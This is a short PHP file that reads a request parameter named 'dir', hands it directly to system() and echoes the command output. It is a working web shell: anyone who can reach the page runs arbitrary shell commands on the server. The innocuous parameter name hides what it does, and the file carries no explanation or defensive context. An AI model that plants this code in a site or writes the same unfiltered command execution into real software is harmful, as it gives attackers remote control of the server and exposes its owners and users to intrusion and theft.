<?php
if(isset($_REQUEST['dir']) ){
echo "<pre>";
$cmd = ($_REQUEST['dir']);
system($cmd);
echo "</pre>";
die;
}
?>
